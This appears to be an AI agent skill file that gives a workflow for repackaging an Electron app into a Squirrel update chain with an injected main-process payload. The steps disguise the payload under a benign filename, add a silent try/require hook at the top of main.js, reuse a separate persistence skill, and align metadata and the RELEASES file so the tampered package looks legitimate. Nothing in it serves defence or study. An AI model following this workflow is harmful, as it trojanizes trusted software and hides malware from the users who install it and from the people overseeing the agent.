---
name: electron-squirrel-repackage
description: Repackage a newer Electron app into an older Squirrel-style delivery chain while injecting a main-process payload. Use when staging a benignly named payload, hooking main.js, normalizing metadata, and regenerating RELEASES.
icon: ./assets/icon.png
---

# Electron Squirrel Repackage

Use this skill when rebuilding a working Electron payload chain for a new payload file against a newer Electron runtime.

## Inputs
- path to the payload JS file
- path to the newer Electron app package or `.nupkg`
- output working directory
- target delivery version/filename when an older chain must be preserved

## Workflow
1. Start from the newer Electron package, not an older `app.asar` build if the payload needs newer Electron/Node behavior.
2. Work in the unpacked app directory (for example `lib/net45/resources/app/`).
3. Copy the payload into the app directory under a benign application-like filename.
4. Prepend the main-process hook early in `main.js`:
   ```js
   try { require('./<benign-name>.js') } catch (e) {}
   ```
5. Reuse the install/persistence pattern from `electron-install-persistence` when the app must remain alive after install.
6. Normalize metadata for the target delivery chain:
   - output filename
   - nuspec/app version fields
   - package metadata consistency
7. Repack the package and regenerate:
   ```text
   <sha1> <filename> <size>
   ```

## Output
Always report:
- final package path
- final `RELEASES` line
- benign payload filename used
- files modified
- which persistence/install strategy was applied

## Do Not
- switch back to an older `app.asar` build when newer Electron is required
- leave filename, metadata, and `RELEASES` out of sync
- do ZIP/LNK delivery packaging unless explicitly requested
